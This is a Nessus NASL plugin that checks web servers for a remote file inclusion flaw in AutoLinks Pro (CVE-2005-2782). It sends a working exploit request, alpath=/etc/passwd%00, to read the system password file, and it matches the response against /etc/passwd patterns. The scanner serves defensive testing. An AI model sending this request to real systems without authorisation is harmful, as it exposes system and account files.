#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(19522);
  script_version("$Revision: 1.14 $");
  script_name(english:"AutoLinks Pro 'al_initialize.php alpath Parameter Remote File Inclusion");

  script_cve_id("CVE-2005-2782");
  script_bugtraq_id(14686);
  script_osvdb_id(19066);
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that suffers from a remote
file include flaw." );
 script_set_attribute(attribute:"description", value:
"The remote host is running AutoLinks Pro, a commercial link management
package. 

The version of AutoLinks Pro installed on the remote host allows
attackers to control the 'alpath' parameter used when including PHP
code in the 'al_initialize.php' script.  By leveraging this flaw, an
unauthenticated attacker is able to view arbitrary files on the remote
host and to execute arbitrary PHP code, possibly taken from third-
party hosts." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/08/29");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/08/28");
 script_cvs_date("$Date: 2011/03/14 21:48:01 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  summary["english"] = "Checks for alpath parameter file include vulnerability in AutoLinks Pro";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");

  script_dependencie("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw to read /etc/passwd.
  r = http_send_recv3(method:"GET", port: port,
    item:string( dir, "/al_initialize.php?",
      "alpath=/etc/passwd%00"));
  if (isnull(r)) exit(0);
  res = strcat(r[0], r[1], '\r\n', r[2]);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but the other flaws
    #     would still be present.
    egrep(string:res, pattern:"Warning.+main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Failed opening .*'/etc/passwd")
  ) {
    security_warning(port);
    exit(0);
  }
}

